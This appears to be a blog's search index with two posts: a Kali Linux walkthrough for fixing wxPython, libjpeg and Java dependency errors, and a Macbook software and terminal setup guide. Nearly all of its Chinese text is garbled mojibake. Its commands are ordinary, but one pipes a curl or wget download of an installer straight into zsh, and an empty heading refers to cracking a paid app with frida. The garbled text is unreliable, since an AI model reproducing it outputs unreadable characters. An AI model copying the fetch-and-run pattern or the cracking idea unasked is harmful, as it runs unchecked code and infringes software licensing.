<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>KaliLinux2021å®‰è£…GUI_Toolsä¾èµ–é—®é¢˜</title>
    <url>/articles/59cbe3b3/</url>
    <content><![CDATA[<h2 id="KaliLinux2021å®‰è£…GUI-Toolsä¾èµ–é—®é¢˜"><a href="#KaliLinux2021å®‰è£…GUI-Toolsä¾èµ–é—®é¢˜" class="headerlink" title="KaliLinux2021å®‰è£…GUI_Toolsä¾èµ–é—®é¢˜"></a>KaliLinux2021å®‰è£…GUI_Toolsä¾èµ–é—®é¢˜</h2><h3 id="WxPythonåº“ä¾èµ–é—®é¢˜"><a href="#WxPythonåº“ä¾èµ–é—®é¢˜" class="headerlink" title="WxPythonåº“ä¾èµ–é—®é¢˜"></a>WxPythonåº“ä¾èµ–é—®é¢˜</h3><hr>
<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003215057722.png" alt="image-20211003215057722"></p>
<p>éœ€è¦å®‰è£… <code>wxpython</code> åº“ , ä½†æ˜¯kali ä¸‹ pip3 å®‰è£…, ç¼–è¯‘ä¼šäº§ç”ŸæŠ¥é”™, å…·ä½“åŸå›  æˆ‘ä¹Ÿä¸æ¸…æ¥š</p>
<p>åªèƒ½è½¬èº«å»å¯»æ‰¾å·²ç»ç¼–è¯‘å¥½äº†çš„whl åŒ…, ç»“æœâ€¦..ç«Ÿç„¶æ²¡æœ‰Linuxçš„åŒ…. å‘œå‘œå‘œ~~</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003215508315.png" alt="image-20211003215508315"></p>
<p>åªèƒ½å»å…¨çƒæœ€å¤§çš„åŒæ€§äº¤å‹ç½‘ç«™gayhub å‘¸~ , <code>github</code> å¯»æ‰¾linuxç‰ˆæœ¬</p>
<p>ç»ˆäºåœ¨wxpythoné¡¹ç›®ç»„çš„ç«™ç‚¹æ‰¾åˆ°äº†éƒ¨åˆ†Linuxçš„whlåŒ…</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003215853397.png" alt="image-20211003215853397"></p>
<p>æ²¡æœ‰é’ˆå¯¹kali çš„åŒ…, é‚£å°±éšä¾¿å†²ä¸€ä¸ªå§ </p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003215930052.png" alt="image-20211003215930052"></p>
<p>çœ‹äº†ä¸€ä¸‹debian , å‘ç°æ²¡æœ‰ python3.9 ç‰ˆæœ¬çš„ , ä½†æ˜¯unbuntu 18.04 æœ‰çš„ , ä¸ç®¡è¿™ä¹ˆå¤šäº†è’™å¤´å†²å°±å¯¹äº†</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003220147241.png" alt="image-20211003220147241"></p>
<p>ä¸‹è½½ , pip install å®‰è£…</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install wxPython-4.1.1-cp39-cp39-linux_x86_64.whl </span><br></pre></td></tr></table></figure>

<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003220307202.png" alt="image-20211003220307202"></p>
<h4 id="ç¬¬ä¸€ä¸ªä¾èµ–é—®é¢˜-libSDL2-2-0-so-0"><a href="#ç¬¬ä¸€ä¸ªä¾èµ–é—®é¢˜-libSDL2-2-0-so-0" class="headerlink" title="ç¬¬ä¸€ä¸ªä¾èµ–é—®é¢˜ libSDL2-2.0.so.0"></a>ç¬¬ä¸€ä¸ªä¾èµ–é—®é¢˜ libSDL2-2.0.so.0</h4><p>#todo  è¿™é‡Œå°‘å¼ å›¾ , ç¼ºå°‘ libSDL2-2.0.so.0</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003220519837.png" alt="image-20211003220519837"></p>
<p>è°·æ­Œä¹‹å, å¾ˆå¿«è§£å†³äº†é—®é¢˜</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003220650344.png" alt="image-20211003220650344"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install libsdl2-mixer-2.0-0 libsdl2-image-2.0-0 libsdl2-2.0-0</span><br></pre></td></tr></table></figure>



<h3 id="ç¬¬äºŒä¸ªä¾èµ–é—®é¢˜-libjpeg-so-8"><a href="#ç¬¬äºŒä¸ªä¾èµ–é—®é¢˜-libjpeg-so-8" class="headerlink" title="ç¬¬äºŒä¸ªä¾èµ–é—®é¢˜  libjpeg.so.8"></a>ç¬¬äºŒä¸ªä¾èµ–é—®é¢˜  libjpeg.so.8</h3><p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003220412476.png" alt="image-20211003220412476"></p>
<p>ç™¾åº¦æ‰¾åˆ°çš„å¾ˆå¤šç»“æœæ˜¯ æ·»åŠ libjpeg.so.8çš„ç¯å¢ƒå˜é‡ </p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003221123978.png" alt="image-20211003221123978"></p>
<p>ä½†kaliæœºå™¨ä¸Šæ²¡æœ‰ libjpeg.so.8 , å‘œå‘œå‘œ</p>
<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003213536750.png" alt="image-20211003213536750"></p>
<p>emmmm , google äº†å¾ˆä¹…ç»ˆäºæ‰¾åˆ°äº† <strong>libjpeg åº“çš„å®‰è£…</strong> </p>
<h5 id="libjpeg-åº“çš„å®‰è£…"><a href="#libjpeg-åº“çš„å®‰è£…" class="headerlink" title="libjpeg åº“çš„å®‰è£…"></a>libjpeg åº“çš„å®‰è£…</h5><p><a href="http://blog.sina.com.cn/s/blog_7956a73c0100wj9s.html">http://blog.sina.com.cn/s/blog_7956a73c0100wj9s.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ijg.org/files/jpegsrc.v8c.tar.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">ï¼ƒmake test  ==&gt; æµ‹è¯•å‘½ä»¤è€Œå·²</span><br></pre></td></tr></table></figure>

<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003221447466.png" alt="image-20211003221447466"></p>
<p>A quick fix is to add the directory that contains <code>libjpeg.so.8</code> to your <code>/etc/ld.so.conf</code> file, and then run <code>ldconfig</code></p>
<p>å°† è·¯å¾„æ·»åŠ åˆ°  <code>/etc/ld.so.conf</code>  ,</p>
<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003222445141.png" alt="image-20211003222445141"></p>
<p> ç„¶åè¿è¡Œ <code>ldconfig</code></p>
<p>åˆ°è¿™é‡Œ, å›¾å½¢åŒ–ç•Œé¢å°±è¡ŒæˆåŠŸè¿è¡Œäº†</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003221748360.png" alt="image-20211003221748360"></p>
<h3 id="Java-æŠ¥é”™"><a href="#Java-æŠ¥é”™" class="headerlink" title="Java æŠ¥é”™"></a>Java æŠ¥é”™</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java: Exec format error</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ, ç”±äºè‡ªå¸¦çš„java ç¯å¢ƒæ˜¯ mac ç³»ç»Ÿçš„ç¨‹åº , è¿™é‡Œä½¿ç”¨Linuxç¯å¢ƒçš„javaè¿›è¡Œæ›¿æ¢è¿›è¡Œäº†</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003222318921.png" alt="image-20211003222318921"></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003210824421.png" alt="image-20211003210824421"></p>
<p>java1.8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.java.com/en/download/manual.jsp</span><br></pre></td></tr></table></figure>

<p>java 9</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://download.java.net/java/GA/jdk9/9.0.4/binaries/openjdk-9.0.4_linux-x64_bin.tar.gz</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹è·¯å¾„</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003222202425.png" alt="image-20211003222202425"></p>
<h4 id="æƒé™é—®é¢˜"><a href="#æƒé™é—®é¢˜" class="headerlink" title="æƒé™é—®é¢˜"></a>æƒé™é—®é¢˜</h4><p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003210104791.png" alt="image-20211003210104791"></p>
<p>ç»™äºˆ java æ‰§è¡Œæƒé™,  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x -R java_1.8/</span><br><span class="line"><span class="built_in">chmod</span> +x -R java9/</span><br></pre></td></tr></table></figure>



<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003214916639.png" alt="image-20211003214916639"></p>
<p>å†™åˆ°è¿™, ç»ˆäºå®Œæˆäº†æ‰€æœ‰ä¾èµ–é—®é¢˜, ç»ˆäºå¯ä»¥å…³é—­æ‰€æœ‰æµè§ˆå™¨æ ‡ç­¾é¡µäº† &#x3D;&#x3D;æ‰‹åŠ¨ç‹—å¤´&#x3D;&#x3D;</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>æŠ€å·§</tag>
        <tag>æ‚è°ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>Macbooké…ç½®æŒ‡åŒ—ï¼ˆupdate ingï¼‰</title>
    <url>/articles/c245633d/</url>
    <content><![CDATA[<h1 id="Macbooké…ç½®æŒ‡åŒ—ï¼ˆupdate-ingï¼‰"><a href="#Macbooké…ç½®æŒ‡åŒ—ï¼ˆupdate-ingï¼‰" class="headerlink" title="Macbooké…ç½®æŒ‡åŒ—ï¼ˆupdate ingï¼‰"></a>Macbooké…ç½®æŒ‡åŒ—ï¼ˆupdate ingï¼‰</h1><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li>å›½å…‰åšå®¢<ul>
<li><a href="https://www.sqlsec.com/2023/09/softmac.html">https://www.sqlsec.com/2023/09/softmac.html</a></li>
<li><a href="https://www.sqlsec.com/2022/01/monterey.html">https://www.sqlsec.com/2022/01/monterey.html</a></li>
</ul>
</li>
</ul>
<h1 id="è½¯ä»¶æ¸…å•"><a href="#è½¯ä»¶æ¸…å•" class="headerlink" title="è½¯ä»¶æ¸…å•"></a>è½¯ä»¶æ¸…å•</h1><p><a href="https://syyu.notion.site/32c6b4946d5c4fa38b343a0fb567d555?v=646540aae6d443e9b8a4c8d9aefc4d8a">https://syyu.notion.site/32c6b4946d5c4fa38b343a0fb567d555?v=646540aae6d443e9b8a4c8d9aefc4d8a</a></p>
<h2 id="raycast-å¿…å¤‡ï¼Œæ— éœ€å¤šè¨€"><a href="#raycast-å¿…å¤‡ï¼Œæ— éœ€å¤šè¨€" class="headerlink" title="raycast(å¿…å¤‡ï¼Œæ— éœ€å¤šè¨€)"></a>raycast(å¿…å¤‡ï¼Œæ— éœ€å¤šè¨€)</h2><p><a href="https://www.raycast.com/">https://www.raycast.com/</a></p>
<h2 id="æµè§ˆå™¨"><a href="#æµè§ˆå™¨" class="headerlink" title="æµè§ˆå™¨"></a>æµè§ˆå™¨</h2><table>
<thead>
<tr>
<th>åç§°</th>
<th>ä¸‹è½½é“¾æ¥</th>
</tr>
</thead>
<tbody><tr>
<td>Chrome</td>
<td><a href="https://www.google.cn/intl/zh-CN/chrome/">https://www.google.cn/intl/zh-CN/chrome/</a></td>
</tr>
<tr>
<td>Arc</td>
<td><a href="https://arc.net/">https://arc.net/</a></td>
</tr>
<tr>
<td>Vivaldi</td>
<td><a href="https://vivaldi.com/zh-hans/">https://vivaldi.com/zh-hans/</a></td>
</tr>
</tbody></table>
<h2 id="ç»ˆç«¯è½¯ä»¶"><a href="#ç»ˆç«¯è½¯ä»¶" class="headerlink" title="ç»ˆç«¯è½¯ä»¶"></a>ç»ˆç«¯è½¯ä»¶</h2><table>
<thead>
<tr>
<th>åç§°</th>
<th>ä¸‹è½½é“¾æ¥</th>
</tr>
</thead>
<tbody><tr>
<td>iTerm2</td>
<td><a href="https://iterm2.com/">https://iterm2.com/</a></td>
</tr>
<tr>
<td>wezterm</td>
<td><a href="https://github.com/wez/wezterm">https://github.com/wez/wezterm</a></td>
</tr>
<tr>
<td>windterm</td>
<td><a href="https://github.com/kingToolbox/WindTerm">https://github.com/kingToolbox/WindTerm</a></td>
</tr>
<tr>
<td>ghostty</td>
<td><a href="https://ghostty.org/">https://ghostty.org/</a></td>
</tr>
</tbody></table>
<h2 id="wezterm"><a href="#wezterm" class="headerlink" title="wezterm"></a>wezterm</h2><p>ç›®å‰åœ¨ä½¿ç”¨çš„æ˜¯weztermï¼Œç”±rustå¼ºåŠ›é©±åŠ¨ã€‚æœ€è¿‘å¬è¯´ <a href="https://ghostty.org/">ghostty</a> ä¹Ÿä¸é”™ï¼Œæ‰¾æœºä¼šè¯•è¯•ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/2025/01/202501121736650713.png"></p>
<h2 id="ç¬”è®°è½¯ä»¶"><a href="#ç¬”è®°è½¯ä»¶" class="headerlink" title="ç¬”è®°è½¯ä»¶"></a>ç¬”è®°è½¯ä»¶</h2><table>
<thead>
<tr>
<th>åç§°</th>
<th>ä¸‹è½½é“¾æ¥</th>
</tr>
</thead>
<tbody><tr>
<td>obsidian</td>
<td><a href="https://obsidian.md/">https://obsidian.md/</a></td>
</tr>
<tr>
<td>è¯­é›€</td>
<td><a href="https://www.yuque.com/">https://www.yuque.com/</a></td>
</tr>
</tbody></table>
<h2 id="ç¼–è¾‘å™¨"><a href="#ç¼–è¾‘å™¨" class="headerlink" title="ç¼–è¾‘å™¨"></a>ç¼–è¾‘å™¨</h2><table>
<thead>
<tr>
<th>åç§°</th>
<th>ä¸‹è½½é“¾æ¥</th>
</tr>
</thead>
<tbody><tr>
<td>vscode</td>
<td><a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></td>
</tr>
<tr>
<td>neovim</td>
<td><a href="https://github.com/neovim/neovim">https://github.com/neovim/neovim</a></td>
</tr>
</tbody></table>
<h2 id="æµé‡"><a href="#æµé‡" class="headerlink" title="æµé‡"></a>æµé‡</h2><table>
<thead>
<tr>
<th>åç§°</th>
<th>ä¸‹è½½é“¾æ¥</th>
</tr>
</thead>
<tbody><tr>
<td>Proxifier</td>
<td><a href="https://www.proxifier.com/">https://www.proxifier.com/</a></td>
</tr>
<tr>
<td>proxychains-ng</td>
<td><a href="https://github.com/rofl0r/proxychains-ng">https://github.com/rofl0r/proxychains-ng</a></td>
</tr>
<tr>
<td>clashx</td>
<td>&#x2F;</td>
</tr>
<tr>
<td>sing-box</td>
<td><a href="https://github.com/SagerNet/sing-box">https://github.com/SagerNet/sing-box</a></td>
</tr>
</tbody></table>
<h3 id="é˜²ç«å¢™è½¯ä»¶"><a href="#é˜²ç«å¢™è½¯ä»¶" class="headerlink" title="é˜²ç«å¢™è½¯ä»¶"></a>é˜²ç«å¢™è½¯ä»¶</h3><table>
<thead>
<tr>
<th>åç§°</th>
<th>ä¸‹è½½é“¾æ¥</th>
</tr>
</thead>
<tbody><tr>
<td>Lu Lu</td>
<td><a href="https://github.com/objective-see/LuLu/">https://github.com/objective-see/LuLu/</a></td>
</tr>
</tbody></table>
<h3 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h3><blockquote>
<p> Tips:<br> é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›å…¥çš„ç»ˆç«¯ï¼Œå°†å…¨å±€è¿›è¡Œæµé‡è½¬å‘</p>
<p> proxychains4 -q &#x2F;bin&#x2F;zsh</p>
</blockquote>
<h4 id="arm-macå®‰è£…æŠ€å·§"><a href="#arm-macå®‰è£…æŠ€å·§" class="headerlink" title="arm-macå®‰è£…æŠ€å·§"></a>arm-macå®‰è£…æŠ€å·§</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install proxychains-ng</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç„¶å æ‰‹åŠ¨ç¼–è¯‘é¡¹ç›®</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/rofl0r/proxychains-ng</span><br><span class="line"></span><br><span class="line">./configure --prefix=/opt/homebrew/Cellar/proxychains-ng/4.16 --sysconfdir=/opt/homebrew/etc --fat-binary-m1 make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<h2 id="ç»ˆç«¯é…ç½®"><a href="#ç»ˆç«¯é…ç½®" class="headerlink" title="ç»ˆç«¯é…ç½®"></a>ç»ˆç«¯é…ç½®</h2><h3 id="zimï¼ˆå¯èƒ½æ˜¯æœ€å¿«çš„zshé…ç½®ï¼‰"><a href="#zimï¼ˆå¯èƒ½æ˜¯æœ€å¿«çš„zshé…ç½®ï¼‰" class="headerlink" title="zimï¼ˆå¯èƒ½æ˜¯æœ€å¿«çš„zshé…ç½®ï¼‰"></a>zimï¼ˆå¯èƒ½æ˜¯æœ€å¿«çš„zshé…ç½®ï¼‰</h3><blockquote>
<p> <a href="https://zimfw.sh/">https://zimfw.sh/</a></p>
</blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://zimfw.sh/docs/install/</span><br><span class="line"></span><br><span class="line">- ä½¿ç”¨Â `curl`ï¼š</span><br><span class="line">curl -fsSL https://raw.githubusercontent.com/zimfw/install/master/install.zsh | zsh</span><br><span class="line">    </span><br><span class="line">- ä½¿ç”¨Â `wget`ï¼š</span><br><span class="line">wget -nv -O - https://raw.githubusercontent.com/zimfw/install/master/install.zsh | zsh</span><br></pre></td></tr></table></figure>

<p>é…ç½®.zimrc</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">zmodule asciiship</span><br><span class="line"></span><br><span class="line"># Additional completion definitions for Zsh.</span><br><span class="line">zmodule zsh-users/zsh-completions --fpath src</span><br><span class="line"># Enables and configures smart and extensive tab completion.</span><br><span class="line"># completion must be sourced after all modules that add completion definitions.</span><br><span class="line">zmodule completion</span><br><span class="line"></span><br><span class="line"># Fish-like syntax highlighting for Zsh.</span><br><span class="line"># zsh-users/zsh-syntax-highlighting must be sourced after completion</span><br><span class="line">zmodule zsh-users/zsh-syntax-highlighting</span><br><span class="line">zmodule zsh-users/zsh-history-substring-search</span><br><span class="line"># Fish-like autosuggestions for Zsh.</span><br><span class="line">zmodule zsh-users/zsh-autosuggestions</span><br><span class="line"></span><br><span class="line">zmodule Aloxaf/fzf-tab</span><br><span class="line">zmodule wookayin/fzf-fasd</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/2025/01/202501121736650715.png"></p>
<h2 id="å³é”®ç®¡ç†"><a href="#å³é”®ç®¡ç†" class="headerlink" title="å³é”®ç®¡ç†"></a>å³é”®ç®¡ç†</h2><h3 id="è¶…çº§å³é”®"><a href="#è¶…çº§å³é”®" class="headerlink" title="è¶…çº§å³é”®"></a>è¶…çº§å³é”®</h3><p><a href="https://www.better365.cn/irightmouse.html">https://www.better365.cn/irightmouse.html</a></p>
<h4 id="crackæ–¹å¼ï¼ˆfridaï¼‰"><a href="#crackæ–¹å¼ï¼ˆfridaï¼‰" class="headerlink" title="crackæ–¹å¼ï¼ˆfridaï¼‰"></a>crackæ–¹å¼ï¼ˆfridaï¼‰</h4><h3 id="Rclick-å¼€æº"><a href="#Rclick-å¼€æº" class="headerlink" title="Rclick(å¼€æº)"></a>Rclick(å¼€æº)</h3><p><a href="https://github.com/wflixu/RClick">https://github.com/wflixu/RClick</a></p>
<h2 id="dockerç®¡ç†"><a href="#dockerç®¡ç†" class="headerlink" title="dockerç®¡ç†"></a>dockerç®¡ç†</h2><h3 id="orbstack"><a href="#orbstack" class="headerlink" title="orbstack"></a>orbstack</h3><blockquote>
<p>å‘Šåˆ«ç¼“æ…¢ã€ç¬¨æ‹™çš„å®¹å™¨å’ŒÂ VMï¼ŒOrbStack æ˜¯è¿è¡Œ Docker å®¹å™¨å’Œ Linux çš„å¿«é€Ÿã€è½»ä¾¿ä¸”ç®€å•çš„æ–¹æ³•ã€‚<br><a href="https://orbstack.dev/">https://orbstack.dev/</a></p>
</blockquote>
<h2 id="AIç›¸å…³"><a href="#AIç›¸å…³" class="headerlink" title="AIç›¸å…³"></a>AIç›¸å…³</h2><h3 id="lobe-chat"><a href="#lobe-chat" class="headerlink" title="lobe-chat"></a>lobe-chat</h3><blockquote>
<p>Lobe Chat - ä¸€ä¸ªå¼€æºçš„ã€ç°ä»£è®¾è®¡çš„ AI èŠå¤©æ¡†æ¶ã€‚æ”¯æŒå¤š AI æä¾›å•†ï¼ˆOpenAI &#x2F; Claude 3 &#x2F; Gemini &#x2F; Ollama &#x2F; Qwen &#x2F; DeepSeekï¼‰ã€çŸ¥è¯†åº“ï¼ˆæ–‡ä»¶ä¸Šä¼ &#x2F;çŸ¥è¯†ç®¡ç† &#x2F; RAGï¼‰ã€å¤šæ¨¡æ€ï¼ˆVision&#x2F;TTS&#x2F;æ’ä»¶&#x2F;å·¥ä»¶ï¼‰ã€‚<br><a href="https://github.com/lobehub/lobe-chat">https://github.com/lobehub/lobe-chat</a></p>
</blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">docker run -d -p 3210:3210 --restart always  --name lobe-chat  lobehub/lobe-chat</span><br></pre></td></tr></table></figure>

<h2 id="ollama"><a href="#ollama" class="headerlink" title="ollama"></a>ollama</h2><blockquote>
<p>æœ¬åœ°åŒ–è¿è¡Œå¤§æ¨¡å‹<br><a href="https://github.com/ollama/ollama">https://github.com/ollama/ollama</a></p>
</blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">brew install ollama</span><br></pre></td></tr></table></figure>

<h2 id="å°å·¥å…·"><a href="#å°å·¥å…·" class="headerlink" title="å°å·¥å…·"></a>å°å·¥å…·</h2><h3 id="ice"><a href="#ice" class="headerlink" title="ice"></a>ice</h3><blockquote>
<p> é€‚ç”¨äº macOS çš„å¼ºå¤§èœå•æ ç®¡ç†å™¨<br> <a href="https://github.com/jordanbaird/Ice">https://github.com/jordanbaird/Ice</a></p>
</blockquote>
<h3 id="easydict"><a href="#easydict" class="headerlink" title="easydict"></a>easydict</h3><blockquote>
<p>ä¸€ä¸ªç®€æ´ä¼˜é›…çš„è¯å…¸ç¿»è¯‘ macOS Appã€‚å¼€ç®±å³ç”¨ï¼Œæ”¯æŒç¦»çº¿ OCR è¯†åˆ«ï¼Œæ”¯æŒæœ‰é“è¯å…¸ï¼ŒğŸ è‹¹æœç³»ç»Ÿè¯å…¸ï¼ŒğŸ è‹¹æœç³»ç»Ÿç¿»è¯‘ï¼ŒOpenAIï¼ŒGeminiï¼ŒDeepLï¼ŒGoogleï¼ŒBingï¼Œè…¾è®¯ï¼Œç™¾åº¦ï¼Œé˜¿é‡Œï¼Œå°ç‰›ï¼Œå½©äº‘å’Œç«å±±ç¿»è¯‘ã€‚<br><a href="https://github.com/tisfeng/Easydict">https://github.com/tisfeng/Easydict</a></p>
</blockquote>
<h3 id="mounty"><a href="#mounty" class="headerlink" title="mounty"></a>mounty</h3><blockquote>
<p>Mounty ç°åœ¨ç”¨ä½œå…è´¹æä¾›çš„ NTFS-3G é©±åŠ¨ç¨‹åºçš„ç”¨æˆ·ç•Œé¢<br><a href="https://mounty.app/">https://mounty.app/</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install --cask macfuse</span><br><span class="line">brew install gromgit/fuse/ntfs-3g-mac</span><br><span class="line">brew install --cask mounty</span><br></pre></td></tr></table></figure>

<h3 id="snipaste"><a href="#snipaste" class="headerlink" title="snipaste"></a>snipaste</h3><blockquote>
<p>ä¸€ä¸ªç®€å•ä½†å¼ºå¤§çš„æˆªå›¾å·¥å…·<br><a href="https://zh.snipaste.com/">https://zh.snipaste.com/</a></p>
</blockquote>
<h3 id="Karabiner-Elements"><a href="#Karabiner-Elements" class="headerlink" title="Karabiner-Elements"></a>Karabiner-Elements</h3><blockquote>
<p>é€‚ç”¨äº macOS çš„å¼ºå¤§è€Œç¨³å®šçš„é”®ç›˜æ˜ å°„å·¥å…·<br><a href="https://karabiner-elements.pqrs.org/">https://karabiner-elements.pqrs.org/</a></p>
</blockquote>
<h3 id="Tiny-RDM"><a href="#Tiny-RDM" class="headerlink" title="Tiny RDM"></a>Tiny RDM</h3><blockquote>
<p>ä¸€ä¸ªæ›´ç°ä»£åŒ–çš„Redisæ¡Œé¢ç®¡ç†å®¢æˆ·ç«¯<br><a href="https://redis.tinycraft.cc/zh/">https://redis.tinycraft.cc/zh/</a></p>
</blockquote>
<h1 id="æ•ˆç‡æå‡æŠ€å·§"><a href="#æ•ˆç‡æå‡æŠ€å·§" class="headerlink" title="æ•ˆç‡æå‡æŠ€å·§"></a>æ•ˆç‡æå‡æŠ€å·§</h1><h2 id="raycastå®ç°çª—å£ç®¡ç†-åº”ç”¨å¿«æ·å¯åŠ¨"><a href="#raycastå®ç°çª—å£ç®¡ç†-åº”ç”¨å¿«æ·å¯åŠ¨" class="headerlink" title="raycastå®ç°çª—å£ç®¡ç†+åº”ç”¨å¿«æ·å¯åŠ¨"></a>raycastå®ç°çª—å£ç®¡ç†+åº”ç”¨å¿«æ·å¯åŠ¨</h2><blockquote>
<p>å°†å¤§å†™é”®ç»‘å®šåˆ° cmd + shift + option + ctrl ï¼Œåšä¸º superkey ,<br>é€šè¿‡Karabiner-Elements å®Œæˆå®ç°ï¼ŒåŒæ—¶å°†å·¦&#x2F;å³shift æ˜ å°„åˆ°è¯­è¨€åˆ‡æ¢æŒ‰é”®</p>
</blockquote>
<p><img src="/assets/image-20241231043255-1.png"></p>
<p>é€šè¿‡raycastè®¾ç½®åº”ç”¨å¿«æ·å¯åŠ¨ï¼Œä¾‹å¦‚ obsidian è®¾ç½®ä¸º Caps + D, æ ¹æ®å–œå¥½ï¼Œè‡ªè¡Œè®¾ç½®</p>
<p><img src="/assets/image-20241231043850-1.png"></p>
<h2 id="jaråŒ…åº”ç”¨å¿«æ·æ‰“å¼€æ–¹å¼"><a href="#jaråŒ…åº”ç”¨å¿«æ·æ‰“å¼€æ–¹å¼" class="headerlink" title="jaråŒ…åº”ç”¨å¿«æ·æ‰“å¼€æ–¹å¼"></a>jaråŒ…åº”ç”¨å¿«æ·æ‰“å¼€æ–¹å¼</h2><p>å…ˆåœ¨raycast ä¸­æ·»åŠ  â€œscripy Directoryâ€ï¼Œè®¾ç½®ä¸€ä¸ªè„šæœ¬æ–‡ä»¶å¤¹</p>
<p><img src="/assets/image-20241231044402-1.png"></p>
<p>é€šè¿‡raycast scriptè„šæœ¬æ‰“å¼€, æ¨¡æ¿å¦‚ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Required parameters:</span></span><br><span class="line"><span class="comment"># @raycast.schemaVersion 1</span></span><br><span class="line"><span class="comment"># @raycast.title jadx-gui</span></span><br><span class="line"><span class="comment"># @raycast.mode silent</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Optional parameters:</span></span><br><span class="line"><span class="comment"># @raycast.icon ğŸ¤–</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh /xxxx/APP/jadx-1.3.2/bin/jadx-gui ; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="/assets/image-20241231044538-1.png"></p>
<h2 id="Touch-ID-æˆæƒ-MacOS-ç»ˆç«¯"><a href="#Touch-ID-æˆæƒ-MacOS-ç»ˆç«¯" class="headerlink" title="Touch ID æˆæƒ MacOS ç»ˆç«¯"></a>Touch ID æˆæƒ MacOS ç»ˆç«¯</h2><p>ä½¿ç”¨æŒ‡çº¹å¿«é€Ÿæˆæƒï¼ŒèŠ‚çœè¾“å…¥å¯†ç çš„æ—¶é—´ã€‚</p>
<p>åœ¨ä½¿ç”¨ sudo å‘½ä»¤çš„æ—¶å€™ï¼Œéœ€è¦è¾“å…¥å¼€æœºå¯†ç æ‰å¯ä»¥è·å– root æƒé™ã€‚å½“å¯†ç ç‰¹åˆ«é•¿çš„æ—¶å€™ï¼Œè¾“å…¥å¯†ç å°±ä¼šç‰¹åˆ«è´¹æ—¶é—´ã€‚</p>
<p>åœ¨ Terminal è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åé‡æ–°å¯åŠ¨ Terminalã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sed -i &quot;.bak&quot; &#x27;2s/^/auth       sufficient     pam_tid.so\&#x27;$&#x27;\n/g&#x27; /etc/pam.d/sudo</span><br></pre></td></tr></table></figure>

